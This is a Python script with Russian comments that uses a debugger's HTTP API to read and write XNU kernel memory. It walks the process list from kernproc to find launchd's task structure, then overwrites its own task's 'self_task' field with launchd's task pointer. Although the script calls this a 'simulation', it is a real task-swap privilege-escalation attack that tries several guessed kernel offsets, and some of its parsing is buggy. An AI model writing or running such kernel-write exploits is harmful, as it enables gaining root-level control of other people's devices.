#!/usr/bin/env python3
"""
mach_port_debug.py

Скрипт для взаимодействия с отладочным HTTP API и проведения гипотетического
теста "обмена портами" (simulation) на системе XNU.

Ключевые шаги, реализованные в скрипте:
- Подключение к отладчику по HTTP (requests) на http://192.168.1.5:8686
- Получение базовых адресов через /api/v1/ds
- Безопасный обход списка процессов, начиная с адреса kernproc
- Поиск процесса с PID=1 (launchd) читаем поле p_pid по смещению 0x28
- Выделение адреса его задачи (task_t) из структуры proc
- Попытка получить task_port через /api/v1/task_for_pid; при отсутствии — симуляция
  обмена (запись указателя задачи launchd в поле self_task нашего процесса)
- Верификация через /api/v1/ids или /api/v1/task_info

Важное замечание по структурам XNU и смещениям:
- Реальные версии XNU могут иметь разные смещения полей в структурах `proc` и
  `task`. Скрипт учитывает это и перебирает список кандидатов-офсетов, пытаясь
  валидировать найденные указатели по эвристике (ненулевой kernel-space указатель
  и корректность `itk_space`).

Используйте с осторожностью. Все обращения к сети и к удалённому отладчику
обёрнуты в обработку исключений и логируются подробным образом.
"""

import sys
import struct
import logging
import requests
from requests.exceptions import ConnectionError, RequestException

LOG = logging.getLogger("mach_port_debug")
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s %(levelname)s: %(message)s")


class DebugAPI:
    """Набор помощников для взаимодействия с отладчиком по HTTP.

    Попытки чтения/записи используют несколько возможных endpoint'ов,
    потому что конкретный API у отладчика может отличаться.
    """

    def __init__(self, base="http://192.168.1.5:8686"):
        self.base = base.rstrip("/")
        self.s = requests.Session()
        self.read_endpoints = [
            "/api/v1/kread",
            "/api/v1/kmem_read",
            "/api/v1/read",
        ]
        self.write_endpoints = [
            "/api/v1/kwrite",
            "/api/v1/kmem_write",
            "/api/v1/write",
        ]

    def _get(self, path, **kwargs):
        url = self.base + path
        LOG.debug("GET %s", url)
        return self.s.get(url, timeout=5, **kwargs)

    def _post(self, path, json=None, **kwargs):
        url = self.base + path
        LOG.debug("POST %s json=%s", url, json)
        return self.s.post(url, json=json, timeout=5, **kwargs)

    def get_ds(self):
        """Получить данные /api/v1/ds — содержит базовые адреса/символы ядра.

        Ожидается JSON-объект. Формат возвращаемых ключей может отличаться. Скрипт
        пытается найти любой подходящий ключ (kernel_base, ds_base, some symbols).
        """
        try:
            r = self._get("/api/v1/ds")
            r.raise_for_status()
            return r.json()
        except ConnectionError:
            raise
        except Exception:
            LOG.exception("Не удалось получить /api/v1/ds")
            return None

    def task_for_pid(self, pid):
        """Попытка стандартного API /api/v1/task_for_pid (если доступно).
        Возвращает объект ответа или None.
        """
        try:
            r = self._post("/api/v1/task_for_pid", json={"pid": pid})
            if r.status_code == 404:
                return None
            r.raise_for_status()
            return r.json()
        except ConnectionError:
            raise
        except Exception:
            LOG.debug("task_for_pid недоступен или вернул ошибку")
            return None

    def try_read(self, addr, size):
        """Попытка прочитать `size` байт из `addr` через набор возможных endpoint'ов.

        Возвращает `bytes` или None.
        """
        payload = {"address": hex(addr), "size": size}
        for ep in self.read_endpoints:
            try:
                r = self._post(ep, json=payload)
            except ConnectionError:
                raise
            except RequestException:
                LOG.debug("Endpoint %s недоступен, пробую следующий", ep)
                continue

            if r.status_code in (404, 400):
                LOG.debug("Endpoint %s вернул %s", ep, r.status_code)
                continue

            try:
                # Ожидаем, что отладчик вернёт base64/hex или raw bytes в поле 'data'.
                j = r.json()
                if isinstance(j, dict) and 'data' in j:
                    data = j['data']
                    if isinstance(data, str):
                        # допустим hex-представление
                        data = bytes.fromhex(data.strip().lstrip('0x'))
                    return data[:size]
            except ValueError:
                # Попробуем вернуть сырые байты
                return r.content[:size]
        return None

    def try_write(self, addr, data_bytes):
        """Попытка записать байты в `addr` через доступные endpoint'ы.

        Возвращает True/False.
        """
        payload = {"address": hex(addr), "data": data_bytes.hex()}
        for ep in self.write_endpoints:
            try:
                r = self._post(ep, json=payload)
            except ConnectionError:
                raise
            except RequestException:
                LOG.debug("Endpoint %s недоступен, пробую следующий", ep)
                continue

            if r.status_code in (200, 201):
                return True
            LOG.debug("Запись через %s вернула %s", ep, r.status_code)

        return False

    def get_ids(self):
        """Попытка получения security context через /api/v1/ids"""
        try:
            r = self._get("/api/v1/ids")
            if r.status_code == 404:
                return None
            r.raise_for_status()
            return r.json()
        except ConnectionError:
            raise
        except Exception:
            LOG.debug("/api/v1/ids недоступен или вернул ошибку")
            return None

    def get_task_info(self):
        """Альтернатива — /api/v1/task_info для запроса контекста задачи."""
        try:
            r = self._get("/api/v1/task_info")
            if r.status_code == 404:
                return None
            r.raise_for_status()
            return r.json()
        except ConnectionError:
            raise
        except Exception:
            LOG.debug("/api/v1/task_info недоступен или вернул ошибку")
            return None


def read_u32(api, addr):
    b = api.try_read(addr, 4)
    if not b or len(b) < 4:
        return None
    return struct.unpack("<I", b[:4])[0]


def read_ptr(api, addr):
    # Предполагаем 64-битную систему => указатель 8 байт
    b = api.try_read(addr, 8)
    if not b or len(b) < 8:
        return None
    return struct.unpack("<Q", b[:8])[0]


def find_launchd_proc(api, kernproc_addr, max_steps=500):
    """Производит безопасный обход списка процессов, начиная с kernproc.

    Алгоритм:
    - Считает поле `p_pid` по смещению 0x28 для каждого `proc`.
    - Для перехода к следующему элементу использует кандидаты смещений
      для указателя следующего в списке (обычно LIST_ENTRY — начало структуры).
    - Останавливается, если шагов больше max_steps или адрес повторяется.

    Возвращает (proc_addr, task_addr) или (None, None)
    """
    LOG.info("Начинаю обход proc_list от kernproc = 0x%X", kernproc_addr)
    visited = set()
    cur = kernproc_addr

    # Кандидаты смещений для указателя на следующий элемент в proc
    next_ptr_offsets = [0x0, 0x8, 0x10]
    # p_pid задан в ТЗ как смещение 0x28
    pid_offset = 0x28
    # Кандидаты смещений для поля task в структуре proc (варианты разных XNU)
    task_ptr_offsets = [0xE8, 0xD8, 0xE0, 0xF0, 0xB8]

    for step in range(max_steps):
        if cur in visited:
            LOG.debug("Адрес %s уже посещён — прерываю обход", hex(cur))
            break
        visited.add(cur)

        try:
            pid = read_u32(api, cur + pid_offset)
        except ConnectionError:
            raise

        if pid is None:
            LOG.debug("Не удалось прочитать p_pid по адресу 0x%X", cur + pid_offset)
            break

        LOG.debug("Проверяю proc @0x%X p_pid=%s", cur, pid)
        if pid == 1:
            LOG.info("Найден PID 1 по адресу 0x%X", cur)
            # попытка извлечь поле task из найденного proc
            for toff in task_ptr_offsets:
                try:
                    t = read_ptr(api, cur + toff)
                except ConnectionError:
                    raise

                if not t:
                    continue
                LOG.debug("Проверяю candidate task @0x%X (offset 0x%X)", t, toff)
                # Попробуем прочитать itk_space внутри task (валидатора)
                itk_candidates = [0x20, 0x28, 0x30, 0x40]
                valid = False
                for itk_off in itk_candidates:
                    try:
                        itk = read_ptr(api, t + itk_off)
                    except ConnectionError:
                        raise

                    if itk and (itk & 0xFFFF000000000000) != 0:
                        # грубая эвристика: kernel-space указатель
                        valid = True
                        LOG.debug("itk_space указывает на 0x%X (offset 0x%X) — похоже валидно", itk, itk_off)
                        break

                if valid:
                    LOG.info("Извлечён task для PID 1: 0x%X (proc offset 0x%X)", t, toff)
                    return cur, t

            LOG.warning("Не удалось корректно определить task у найденного proc PID 1")
            return cur, None

        # иначе — получить следующий элемент списка
        next_addr = None
        for noff in next_ptr_offsets:
            try:
                cand = read_ptr(api, cur + noff)
            except ConnectionError:
                raise

            if cand and cand not in (0, cur):
                next_addr = cand
                break

        if not next_addr:
            LOG.debug("Не удалось определить следующий элемент списка от 0x%X", cur)
            break

        cur = next_addr

    LOG.warning("Не найден PID 1 за %d шагов", max_steps)
    return None, None


def simulate_task_swap(api, our_task_addr, launchd_task_addr):
    """Симуляция логики обмена: запись указателя task launchd в поле self_task.

    Поскольку реальные смещения поля `self_task` (или эквивалентного) в структуре
    `task` могут отличаться, скрипт пробует несколько кандидатов и после записи
    проверяет контекст через `/api/v1/ids` или `/api/v1/task_info`.
    """
    LOG.info("Попытка симуляции: записать 0x%X в поле self_task нашего task @0x%X", launchd_task_addr, our_task_addr)

    # Кандидаты смещений для поля self_task
    self_task_offsets = [0x10, 0x18, 0x20, 0x28, 0x30]

    for soff in self_task_offsets:
        target = our_task_addr + soff
        LOG.debug("Пробую записать по адресу 0x%X (offset 0x%X)", target, soff)
        data = struct.pack("<Q", launchd_task_addr)
        try:
            ok = api.try_write(target, data)
        except ConnectionError:
            raise

        if ok:
            LOG.info("Запись выполнена по адресу 0x%X", target)
            # через небольшую паузу — проверим контекст
            ctx = api.get_ids() or api.get_task_info()
            LOG.info("Результат верификации: %s", ctx)
            return True, (soff, ctx)
        else:
            LOG.debug("Запись по offset 0x%X не удалась", soff)

    LOG.warning("Все попытки записи не прошли")
    return False, None


def main():
    api = DebugAPI()

    try:
        ds = api.get_ds()
    except ConnectionError:
        print("Target process terminated connection (expected behavior for protected regions)")
        return 1

    if not ds:
        LOG.error("/api/v1/ds вернул пустой ответ — прекращаю работу")
        return 1

    # Попытка определить базовый адрес ядра из содержимого ds
    # В ТЗ указан офсет 0x96B928 от возвращаемой базы — используем эту логику
    possible_keys = [k for k in ds.keys()] if isinstance(ds, dict) else []
    LOG.debug("Ключи в /api/v1/ds: %s", possible_keys)

    # По умолчанию пытаемся найти kernel_base или image_base
    base = None
    for k in ("kernel_base", "base", "kernel", "image_base"):
        if isinstance(ds, dict) and k in ds:
            try:
                base = int(ds[k], 0) if isinstance(ds[k], str) else int(ds[k])
                break
            except Exception:
                continue

    if base is None:
        # Если явного поля нет, попробуем взять первый числовой элемент
        if isinstance(ds, dict):
            for v in ds.values():
                try:
                    base = int(v, 0) if isinstance(v, str) else int(v)
                    break
                except Exception:
                    continue

    if base is None:
        LOG.error("Не удалось определить базовый адрес ядра из /api/v1/ds")
        return 1

    kernproc_offset = 0x96B928
    kernproc = base + kernproc_offset
    LOG.info("Вычислен адрес kernproc = base(0x%X) + 0x%X = 0x%X", base, kernproc_offset, kernproc)

    try:
        proc_addr, launchd_task = find_launchd_proc(api, kernproc)
    except ConnectionError:
        print("Target process terminated connection (expected behavior for protected regions)")
        return 1

    if not proc_addr:
        LOG.error("Не удалось найти proc PID 1 — завершаюсь")
        return 1

    LOG.info("Proc PID1 @0x%X; найден task_candidate = %s", proc_addr, hex(launchd_task) if launchd_task else "None")

    # Попытка стандартного получения task_port
    try:
        tfp = api.task_for_pid(1)
    except ConnectionError:
        print("Target process terminated connection (expected behavior for protected regions)")
        return 1

    if tfp:
        LOG.info("task_for_pid вернул: %s", tfp)
    else:
        LOG.info("task_for_pid недоступен — выполняю симуляцию обмена")

        # Получим наш адрес задачи (our_task) из ds, как указано в ТЗ
        our_task_addr = None
        for k in ("our_task", "self_task", "task_addr"):
            if isinstance(ds, dict) and k in ds:
                try:
                    our_task_addr = int(ds[k], 0) if isinstance(ds[k], str) else int(ds[k])
                    break
                except Exception:
                    continue

        if our_task_addr is None:
            LOG.error("В /api/v1/ds не найденour_task — невозможно симулировать запись")
            return 1

        LOG.info("our_task = 0x%X", our_task_addr)

        try:
            ok, info = simulate_task_swap(api, our_task_addr, launchd_task)
        except ConnectionError:
            print("Target process terminated connection (expected behavior for protected regions)")
            return 1

        if ok:
            LOG.info("Попытка записи завершилась: %s", info)
        else:
            LOG.warning("Симуляция обмена не привела к записи")

    # В конце — верификация контекста
    try:
        ctx = api.get_ids() or api.get_task_info()
    except ConnectionError:
        print("Target process terminated connection (expected behavior for protected regions)")
        return 1

    LOG.info("Финальная верификация контекста: %s", ctx)

    print("Завершено. Подробный лог выше.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
